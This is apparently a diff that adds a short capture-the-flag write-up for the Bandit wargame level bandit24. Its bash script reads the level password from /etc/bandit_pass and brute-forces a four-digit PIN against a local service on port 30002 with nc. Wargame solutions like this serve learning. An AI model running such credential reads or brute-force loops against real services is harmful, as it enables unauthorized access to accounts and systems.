@@ -1,0 +1,17 @@
+The only way to break this one is to brute force the port I used the following code
+
+#/bin/bash
+pw=$(cat /etc/bandit_pass/bandit24)
+echo $pw
+for i in $(seq -w 0000 9999);
+do
+	return=$(echo "$pw $i" | nc -w 1 localhost 30002 )
+	echo $return >> data.txt
+	echo "Trying $i"
+	if [[ "$return" == *"Wrong"* ]];then
+		echo "Fail"
+	else 
+		echo $return
+		break
+	fi
+done
